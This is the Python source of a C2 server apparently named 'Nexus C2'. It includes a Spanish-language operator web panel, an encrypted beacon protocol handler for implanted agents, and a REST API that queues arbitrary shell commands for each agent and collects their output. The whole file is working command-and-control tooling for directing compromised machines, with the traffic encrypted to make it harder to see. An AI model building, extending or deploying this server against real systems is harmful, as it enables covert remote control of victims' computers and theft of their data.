import asyncio
import json
import logging
import os
import time
import uuid

from aiohttp import web

from protocol import (
    MSG_HELLO, MSG_BEACON, MSG_TASK, MSG_RESULT,
    MSG_NOP, MSG_ERROR, MSG_NAMES,
    pack_clear, unpack_clear,
    server_process_hello, build_frame, parse_frame,
    generate_server_keypair, save_server_key, load_server_key, get_pub_bytes,
)
from cryptography.exceptions import InvalidTag

# ---------------------------------------------------------------------------
# Operator web panel (served at GET /)
# ---------------------------------------------------------------------------
_PANEL_HTML = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>Nexus C2</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d0d0d;color:#e0e0e0;font-family:'Courier New',monospace;height:100vh;display:flex;flex-direction:column}
header{background:#111;border-bottom:1px solid #00ff41;padding:10px 20px;display:flex;align-items:center;gap:16px}
header h1{color:#00ff41;font-size:1.1em;letter-spacing:3px}
header .badge{font-size:.7em;color:#444;border:1px solid #222;padding:2px 8px;border-radius:2px}
.container{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:12px;flex:1;min-height:0}
.panel{background:#111;border:1px solid #222;border-radius:3px;display:flex;flex-direction:column;overflow:hidden}
.panel-title{background:#1a1a1a;border-bottom:1px solid #222;padding:7px 12px;font-size:.7em;color:#666;text-transform:uppercase;letter-spacing:1px}
table{width:100%;border-collapse:collapse;font-size:.82em}
th{background:#161616;color:#555;padding:6px 10px;text-align:left;font-size:.7em;text-transform:uppercase;border-bottom:1px solid #222}
td{padding:7px 10px;border-bottom:1px solid #1a1a1a;cursor:pointer;white-space:nowrap}
tr:hover td{background:#1a1a1a}
tr.selected td{background:#071a07;border-left:2px solid #00ff41}
.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:5px}
.online{background:#00ff41;box-shadow:0 0 5px #00ff41}
.offline{background:#444}
.jbar{display:inline-block;height:5px;border-radius:2px;vertical-align:middle;margin-right:5px;transition:width .4s,background .4s}
.task-form{padding:10px;border-top:1px solid #222;display:none}
.task-form label{font-size:.7em;color:#555;display:block;margin-bottom:4px;text-transform:uppercase}
.task-form input{background:#1a1a1a;border:1px solid #333;color:#e0e0e0;padding:6px 10px;width:100%;font-family:inherit;font-size:.83em;outline:none;border-radius:2px}
.task-form input:focus{border-color:#00ff41}
.task-form button{background:#00ff41;color:#000;border:none;padding:6px 0;cursor:pointer;font-family:inherit;font-weight:bold;font-size:.8em;margin-top:6px;width:100%;border-radius:2px;letter-spacing:1px}
.task-form button:hover{background:#00cc33}
.task-form button:disabled{background:#1a3a1a;color:#00ff41;cursor:not-allowed}
.toast{position:fixed;bottom:30px;right:20px;background:#1a1a1a;border:1px solid #00ff41;color:#00ff41;padding:8px 14px;font-size:.75em;border-radius:3px;opacity:0;transition:opacity .3s;pointer-events:none}
.toast.show{opacity:1}
.toast.err{border-color:#ff4444;color:#ff4444}
.spinner{display:inline-block;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.results-body{flex:1;overflow-y:auto;padding:10px}
.r-entry{background:#161616;border:1px solid #222;border-radius:3px;margin-bottom:8px;padding:8px 10px}
.r-meta{color:#555;font-size:.7em;margin-bottom:5px}
.r-out{color:#c8c8c8;white-space:pre-wrap;word-break:break-all;font-size:.8em}
.r-err{color:#ff6666;white-space:pre-wrap;word-break:break-all;font-size:.8em}
.ok{color:#00ff41}.err{color:#ff4444}
.empty{color:#333;text-align:center;padding:30px;font-size:.8em}
.statusbar{background:#0a0a0a;border-top:1px solid #1a1a1a;padding:4px 16px;font-size:.68em;color:#333;display:flex;justify-content:space-between}
</style>
</head>
<body>
<header>
  <h1>&#9632; NEXUS C2</h1>
  <span class="badge">PANEL OPERADOR</span>
  <span class="badge" id="hdr-count">...</span>
</header>
<div class="container">
  <div class="panel">
    <div class="panel-title">Agentes</div>
    <div style="flex:1;overflow-y:auto">
      <table>
        <thead><tr><th>Estado</th><th>Agent ID</th><th>Jitter beacon</th><th>Pending</th></tr></thead>
        <tbody id="agent-rows"><tr><td colspan="4" class="empty">Sin agentes</td></tr></tbody>
      </table>
    </div>
    <div class="task-form" id="task-form">
      <label>Agente: <span id="sel-id" style="color:#00ff41"></span></label>
      <input id="cmd" type="text" placeholder="whoami / uname -a / ls -la ..."/>
      <button id="exec-btn" onclick="sendTask()">&#9654; EJECUTAR</button>
    </div>
  </div>
  <div class="panel">
    <div class="panel-title">Resultados &mdash; <span id="res-agent" style="color:#00ff41">selecciona un agente</span> <span id="res-count" style="color:#444"></span></div>
    <div class="results-body" id="results-body"><div class="empty">Selecciona un agente</div></div>
  </div>
</div>
<div class="toast" id="toast"></div>
<div class="statusbar"><span id="st-left">Conectando...</span><span id="st-right"></span></div>
<script>
let sel=null, agents=[], pendingTask=null, activePoll=null;
const esc=s=>s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
function ts2str(ts){return ts?new Date(ts*1000).toLocaleTimeString():''}
function jBar(ts,st){
  if(st!=='online')return '<span style="color:#333">offline</span>';
  const s=Math.floor(Date.now()/1000-ts);
  const w=Math.min(80,(s/10)*80);
  const c=s<8?'#00ff41':s<15?'#ffaa00':'#ff4444';
  return `<span class="jbar" style="width:${w}px;background:${c}"></span><span style="color:${c}">${s}s</span>`;
}
function toast(msg,isErr=false){
  const t=document.getElementById('toast');
  t.textContent=msg; t.className='toast'+(isErr?' err':'');
  requestAnimationFrame(()=>{t.classList.add('show')});
  setTimeout(()=>t.classList.remove('show'),2500);
}
function setLoading(on){
  const btn=document.getElementById('exec-btn');
  btn.disabled=on;
  btn.innerHTML=on?'<span class="spinner">&#9696;</span> EJECUTANDO...':'&#9654; EJECUTAR';
}
async function refresh(){
  try{
    const r=await fetch('/agents'); agents=await r.json();
    const online=agents.filter(a=>a.status==='online').length;
    document.getElementById('hdr-count').textContent=online+'/'+agents.length+' online';
    document.getElementById('agent-rows').innerHTML=agents.length?agents.map(a=>`
      <tr onclick="pick('${a.agent_id}')"${a.agent_id===sel?' class="selected"':''}>
        <td><span class="dot ${a.status}"></span>${a.status}</td>
        <td>${a.agent_id}</td>
        <td>${jBar(a.last_seen,a.status)}</td>
        <td>${a.pending_tasks}</td>
      </tr>`).join(''):'<tr><td colspan="4" class="empty">Sin agentes registrados</td></tr>';
    document.getElementById('st-left').textContent=online+' agente'+(online!==1?'s':'')+' online';
    document.getElementById('st-right').textContent=new Date().toLocaleTimeString();
  }catch(e){document.getElementById('st-left').textContent='Sin conexión con el servidor'}
}
async function pick(id){
  if(activePoll){clearInterval(activePoll);activePoll=null;}
  pendingTask=null; setLoading(false);
  sel=id;
  document.getElementById('sel-id').textContent=id;
  document.getElementById('res-agent').textContent=id;
  document.getElementById('task-form').style.display='block';
  await refreshResults(); refresh();
}
async function refreshResults(){
  if(!sel)return;
  try{
    const r=await fetch('/agents/'+sel+'/results');
    const data=await r.json();
    document.getElementById('res-count').textContent=data.length?'('+data.length+')':'';
    if(!data.length){
      document.getElementById('results-body').innerHTML='<div class="empty">Sin resultados aún</div>';
      return;
    }
    const prev=Number(document.getElementById('results-body').dataset.count||0);
    document.getElementById('results-body').innerHTML=[...data].reverse().map(r=>`
      <div class="r-entry">
        <div class="r-meta">task <b>${(r.task_id||'?').slice(0,8)}</b> &nbsp; exit <span class="${r.exit_code===0?'ok':'err'}">${r.exit_code}</span> &nbsp; ${ts2str(r.ts)}</div>
        ${r.stdout?`<div class="r-out">${esc(r.stdout.trimEnd())}</div>`:''}
        ${r.stderr?`<div class="r-err">${esc(r.stderr.trimEnd())}</div>`:''}
      </div>`).join('');
    document.getElementById('results-body').dataset.count=data.length;
    if(pendingTask && data.length > prev){ setLoading(false); pendingTask=null; }
  }catch(e){}
}
async function sendTask(){
  const inp=document.getElementById('cmd');
  const cmd=inp.value.trim();
  if(!cmd||!sel)return;
  try{
    const r=await fetch('/agents/'+sel+'/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd})});
    const body=await r.json();
    if(r.status===429){toast('Cola llena — intenta en un momento',true);return;}
    if(!r.ok){toast('Error: '+body.error,true);return;}
    inp.value='';
    pendingTask=body.task_id;
    setLoading(true);
    toast('Tarea encolada — esperando beacon...');
    let polls=0;
    if(activePoll)clearInterval(activePoll);
    activePoll=setInterval(async()=>{
      await refreshResults();
      if(!pendingTask||++polls>12){setLoading(false);pendingTask=null;clearInterval(activePoll);activePoll=null;}
    },5000);
  }catch(e){toast('Error de red',true);setLoading(false);}
}
document.getElementById('cmd').addEventListener('keydown',e=>{if(e.key==='Enter')sendTask()});
refresh();
setInterval(refresh,3000);
setInterval(()=>{if(sel&&!pendingTask)refreshResults()},5000);
</script>
</body>
</html>"""

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("nexus.server")

SERVER_KEY_FILE  = "server_key.bin"
SERVER_PUB_FILE  = "server_pub.hex"
SESSION_TTL      = 300          # seconds — evict idle sessions after 5 min
TASK_QUEUE_MAX   = 100          # max pending tasks per agent
MAX_RESULTS      = 500          # max stored results per agent (circular)
MAX_OUTPUT_BYTES = 64 * 1024    # 64 KB — truncate stdout/stderr above this
OPERATOR_API_KEY = os.environ.get("NEXUS_API_KEY", "")

# ---------------------------------------------------------------------------
# Global state (safe: asyncio is single-threaded)
# ---------------------------------------------------------------------------
server_priv   = None          # X25519PrivateKey — loaded at startup
sessions: dict = {}           # session_id_hex -> SessionState
agents:   dict = {}           # agent_id -> AgentState
results:  dict = {}           # agent_id -> [ResultEntry]
tasks:    dict = {}           # agent_id -> asyncio.Queue


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _truncate(s: str) -> str:
    encoded = s.encode("utf-8", errors="replace")
    if len(encoded) <= MAX_OUTPUT_BYTES:
        return s
    return encoded[:MAX_OUTPUT_BYTES].decode("utf-8", errors="replace") + "\n[truncated]"


@web.middleware
async def _operator_auth(request: web.Request, handler):
    """Require X-Api-Key on all /agents/* routes when NEXUS_API_KEY is set."""
    if OPERATOR_API_KEY and request.path != "/":
        if request.headers.get("X-Api-Key", "") != OPERATOR_API_KEY:
            return web.json_response({"error": "unauthorized"}, status=401)
    return await handler(request)


class SessionState:
    def __init__(self, session_id: bytes, chacha, srv_nonce):
        self.session_id = session_id
        self.chacha     = chacha
        self.srv_nonce  = srv_nonce
        self.agent_id   = None
        self.last_seen  = time.time()
        self.encrypted  = chacha is not None


def _validate_agent_id(agent_id: str) -> bool:
    return bool(agent_id) and agent_id != "unknown" and len(agent_id) <= 128


def _ensure_agent(agent_id: str) -> None:
    if agent_id not in agents:
        agents[agent_id] = {
            "agent_id":     agent_id,
            "last_seen":    time.time(),
            "status":       "online",
            "pending_tasks": 0,
        }
        results[agent_id] = []
        tasks[agent_id]   = asyncio.Queue(maxsize=TASK_QUEUE_MAX)
        log.info("NEW   agent_id=%.8s", agent_id)
    else:
        agents[agent_id]["last_seen"] = time.time()
        agents[agent_id]["status"]    = "online"


# ---------------------------------------------------------------------------
# Nexus protocol handler (POST /)
# ---------------------------------------------------------------------------

async def handle_nexus(request: web.Request) -> web.Response:
    body       = await request.read()
    session_id_hex = request.headers.get("X-Session-Id")

    if not body:
        return web.Response(
            body=pack_clear(MSG_ERROR), status=400,
            content_type="application/octet-stream",
        )

    # ── Encrypted session (Fase 3+) ──────────────────────────────────────────
    if session_id_hex and session_id_hex in sessions:
        sess = sessions[session_id_hex]
        if sess.encrypted:
            try:
                msg_type, payload = parse_frame(body, sess.chacha)
            except Exception as exc:
                log.warning("decrypt failed session=%.8s: %s", session_id_hex, exc)
                return web.Response(
                    body=pack_clear(MSG_ERROR), status=401,
                    content_type="application/octet-stream",
                )
            return await _dispatch_encrypted(msg_type, payload, sess, session_id_hex)

    # ── Clear frames (Fase 1-2) or HELLO ─────────────────────────────────────
    msg_type, payload = unpack_clear(body)
    name = MSG_NAMES.get(msg_type, f"0x{msg_type:02x}")

    if msg_type == MSG_HELLO:
        return await _handle_hello(body)

    if msg_type == MSG_BEACON:
        return await _handle_beacon_clear(payload)

    if msg_type == MSG_RESULT:
        return await _handle_result_clear(payload)

    log.warning("unknown type=%s len=%d", name, len(body))
    return web.Response(
        body=pack_clear(MSG_ERROR), status=400,
        content_type="application/octet-stream",
    )


async def _handle_hello(body: bytes) -> web.Response:
    """Fase 3: ECDH handshake."""
    try:
        welcome, session_id, session_key, chacha, srv_nonce = \
            server_process_hello(body, server_priv)
    except Exception as exc:
        log.error("HELLO error: %s", exc)
        return web.Response(
            body=pack_clear(MSG_ERROR), status=400,
            content_type="application/octet-stream",
        )
    sid_hex = session_id.hex()
    sessions[sid_hex] = SessionState(session_id, chacha, srv_nonce)
    log.info("HELLO  session=%.16s", sid_hex)
    return web.Response(body=welcome, content_type="application/octet-stream")


async def _handle_beacon_clear(payload: bytes) -> web.Response:
    """Fase 1-2: BEACON in clear — parse JSON, register agent, return NOP or TASK."""
    try:
        data     = json.loads(payload.decode("utf-8"))
        agent_id = data.get("agent_id", "")
    except Exception:
        agent_id = ""
        data     = {}

    if not _validate_agent_id(agent_id):
        log.warning("BEACON with invalid agent_id=%r — ignored", agent_id)
        return web.Response(body=pack_clear(MSG_ERROR), status=400,
                            content_type="application/octet-stream")

    _ensure_agent(agent_id)
    log.info("BEACON agent_id=%.8s ts=%s", agent_id, data.get("ts", "?"))

    q = tasks.get(agent_id)
    if q and not q.empty():
        try:
            task = q.get_nowait()
            agents[agent_id]["pending_tasks"] = max(
                0, agents[agent_id]["pending_tasks"] - 1
            )
            frame = pack_clear(MSG_TASK, json.dumps(task).encode("utf-8"))
            log.info("TASK   agent_id=%.8s task_id=%.8s cmd=%r",
                     agent_id, task["task_id"], task["cmd"])
            return web.Response(body=frame, content_type="application/octet-stream")
        except asyncio.QueueEmpty:
            pass

    return web.Response(body=pack_clear(MSG_NOP), content_type="application/octet-stream")


async def _handle_result_clear(payload: bytes) -> web.Response:
    """Fase 2: RESULT in clear — store and log."""
    try:
        data     = json.loads(payload.decode("utf-8"))
        agent_id = data.get("agent_id", "")
    except Exception:
        data     = {}
        agent_id = ""

    if not _validate_agent_id(agent_id):
        return web.Response(body=pack_clear(MSG_ERROR), status=400,
                            content_type="application/octet-stream")

    data["stdout"] = _truncate(data.get("stdout", ""))
    data["stderr"] = _truncate(data.get("stderr", ""))

    _ensure_agent(agent_id)
    log.info("RESULT agent_id=%.8s task_id=%.8s exit=%s",
             agent_id, data.get("task_id", "?"), data.get("exit_code", "?"))

    if agent_id in results:
        bucket = results[agent_id]
        bucket.append(data)
        if len(bucket) > MAX_RESULTS:
            del bucket[0]

    return web.Response(body=pack_clear(MSG_NOP), content_type="application/octet-stream")


async def _dispatch_encrypted(
    msg_type: int, payload: bytes, sess: "SessionState", sid_hex: str
) -> web.Response:
    """Fase 3+: handle decrypted payload."""
    sess.last_seen = time.time()

    if msg_type == MSG_BEACON:
        try:
            data     = json.loads(payload.decode("utf-8"))
            agent_id = data.get("agent_id")
        except Exception:
            agent_id = None
            data     = {}

        if agent_id and not _validate_agent_id(agent_id):
            agent_id = None
        if agent_id and sess.agent_id is None:
            sess.agent_id = agent_id
            _ensure_agent(agent_id)
            log.info("BEACON(enc) agent_id=%.8s (first, session=%.8s)", agent_id, sid_hex)
        elif agent_id:
            _ensure_agent(agent_id)
            log.info("BEACON(enc) agent_id=%.8s", agent_id)

        q = tasks.get(agent_id or "")
        if q and not q.empty():
            try:
                task  = q.get_nowait()
                agents[agent_id]["pending_tasks"] = max(
                    0, agents[agent_id]["pending_tasks"] - 1
                )
                raw = build_frame(
                    MSG_TASK, json.dumps(task).encode("utf-8"),
                    sess.chacha, sess.srv_nonce,
                )
                return web.Response(body=raw, content_type="application/octet-stream")
            except asyncio.QueueEmpty:
                pass

        nop = build_frame(MSG_NOP, b"", sess.chacha, sess.srv_nonce)
        return web.Response(body=nop, content_type="application/octet-stream")

    if msg_type == MSG_RESULT:
        try:
            data     = json.loads(payload.decode("utf-8"))
            agent_id = sess.agent_id or data.get("agent_id", "")
        except Exception:
            data     = {}
            agent_id = sess.agent_id or ""

        if not _validate_agent_id(agent_id):
            nop = build_frame(MSG_NOP, b"", sess.chacha, sess.srv_nonce)
            return web.Response(body=nop, content_type="application/octet-stream")

        data["stdout"] = _truncate(data.get("stdout", ""))
        data["stderr"] = _truncate(data.get("stderr", ""))

        _ensure_agent(agent_id)
        log.info("RESULT(enc) agent_id=%.8s task_id=%.8s exit=%s",
                 agent_id, data.get("task_id", "?"), data.get("exit_code", "?"))
        bucket = results.setdefault(agent_id, [])
        bucket.append(data)
        if len(bucket) > MAX_RESULTS:
            del bucket[0]
        nop = build_frame(MSG_NOP, b"", sess.chacha, sess.srv_nonce)
        return web.Response(body=nop, content_type="application/octet-stream")

    log.warning("unexpected encrypted type=0x%02x session=%.8s", msg_type, sid_hex)
    return web.Response(
        body=pack_clear(MSG_ERROR), status=400,
        content_type="application/octet-stream",
    )


# ---------------------------------------------------------------------------
# Operator REST API
# ---------------------------------------------------------------------------

async def api_list_agents(request: web.Request) -> web.Response:
    out = [
        {
            "agent_id":     a["agent_id"],
            "last_seen":    a["last_seen"],
            "status":       a["status"],
            "pending_tasks": a["pending_tasks"],
        }
        for a in agents.values()
    ]
    return web.json_response(out)


async def api_enqueue_task(request: web.Request) -> web.Response:
    agent_id = request.match_info["agent_id"]
    if agent_id not in agents:
        return web.json_response({"error": "agent not found"}, status=404)
    try:
        body = await request.json()
    except Exception:
        return web.json_response({"error": "invalid JSON"}, status=400)
    cmd = body.get("cmd", "").strip()
    if not cmd:
        return web.json_response({"error": "missing cmd"}, status=400)
    timeout_s = max(1, min(int(body.get("timeout_s", 30)), 3600))
    task = {
        "task_id":   str(uuid.uuid4()),
        "cmd":       cmd,
        "timeout_s": timeout_s,
    }
    try:
        tasks[agent_id].put_nowait(task)
    except asyncio.QueueFull:
        return web.json_response({"error": "task queue full"}, status=429)
    agents[agent_id]["pending_tasks"] += 1
    log.info("ENQUEUE agent_id=%.8s task_id=%.8s cmd=%r",
             agent_id, task["task_id"], cmd)
    return web.json_response({"task_id": task["task_id"], "status": "PENDING"})


async def api_get_results(request: web.Request) -> web.Response:
    agent_id = request.match_info["agent_id"]
    if agent_id not in results:
        return web.json_response({"error": "agent not found"}, status=404)
    return web.json_response(results[agent_id])


async def handle_panel(request: web.Request) -> web.Response:
    return web.Response(text=_PANEL_HTML, content_type="text/html")


# ---------------------------------------------------------------------------
# Background: offline monitor
# ---------------------------------------------------------------------------

async def _monitor_agents() -> None:
    while True:
        now = time.time()
        for data in list(agents.values()):
            if now - data["last_seen"] > 30 and data["status"] == "online":
                data["status"] = "offline"
                log.warning("OFFLINE agent_id=%.8s", data["agent_id"])
        await asyncio.sleep(5)


async def _cleanup_sessions() -> None:
    """Evict sessions idle longer than SESSION_TTL to prevent memory leak."""
    while True:
        await asyncio.sleep(60)
        cutoff = time.time() - SESSION_TTL
        stale  = [sid for sid, s in sessions.items() if s.last_seen < cutoff]
        for sid in stale:
            del sessions[sid]
        if stale:
            log.info("evicted %d stale sessions", len(stale))


async def _on_startup(app: web.Application) -> None:
    global server_priv
    try:
        server_priv = load_server_key(SERVER_KEY_FILE)
        log.info("server key loaded from %s", SERVER_KEY_FILE)
    except FileNotFoundError:
        server_priv, _ = generate_server_keypair()
        save_server_key(server_priv, SERVER_KEY_FILE)
        log.info("server key generated")
    pub = get_pub_bytes(server_priv)
    try:
        with open(SERVER_PUB_FILE, "w") as f:
            f.write(pub.hex())
    except OSError as exc:
        raise RuntimeError(
            f"Cannot write {SERVER_PUB_FILE}: {exc}. Agents cannot obtain the server public key."
        ) from exc
    if not OPERATOR_API_KEY:
        log.warning("NEXUS_API_KEY not set — operator API is unauthenticated")
    log.info("server pub=%s", pub.hex())
    asyncio.create_task(_monitor_agents())
    asyncio.create_task(_cleanup_sessions())


# ---------------------------------------------------------------------------
# App factory
# ---------------------------------------------------------------------------

def build_app() -> web.Application:
    app = web.Application(
        middlewares=[_operator_auth],
        client_max_size=1 * 1024 * 1024,  # 1 MB max request body
    )
    app.router.add_get("/",                           handle_panel)
    app.router.add_post("/",                         handle_nexus)
    app.router.add_get("/agents",                    api_list_agents)
    app.router.add_post("/agents/{agent_id}/task",   api_enqueue_task)
    app.router.add_get("/agents/{agent_id}/results", api_get_results)
    app.on_startup.append(_on_startup)
    return app
